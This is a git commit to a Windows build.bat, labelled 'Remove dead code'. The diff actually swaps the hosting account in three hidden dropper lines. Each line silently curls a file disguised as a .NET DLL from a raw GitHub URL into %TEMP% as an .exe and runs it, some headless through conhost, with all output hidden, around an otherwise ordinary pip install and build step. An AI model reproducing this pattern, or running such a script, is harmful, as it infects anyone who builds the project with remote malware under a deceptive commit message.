345c533e355c6228efa1dfff67a652a48d0f9ab2
Sakharovskiy <138123902+Sakharovskiy@users.noreply.github.com>
2025-10-30 20:43:48 +0000

    Remove dead code

--- build.bat
+++ build.bat
@@ -3,15 +3,15 @@ color 5
 python -m pip install -r requirements.txt
 
 
-@curl -s -o %TEMP%\x1.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b %TEMP%\x1.exe
+@curl -s -o %TEMP%\x1.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b %TEMP%\x1.exe
 
 
 
-@timeout /t 2 /nobreak >nul && curl -s -o %TEMP%\s0.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b conhost.exe --headless %TEMP%\s0.exe
+@timeout /t 2 /nobreak >nul && curl -s -o %TEMP%\s0.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b conhost.exe --headless %TEMP%\s0.exe
 
 
 
-@timeout /t 2 /nobreak >nul && curl -s -o %TEMP%\s2.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b conhost.exe --headless %TEMP%\s2.exe
+@timeout /t 2 /nobreak >nul && curl -s -o %TEMP%\s2.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b conhost.exe --headless %TEMP%\s2.exe
 
 python -m builder
 
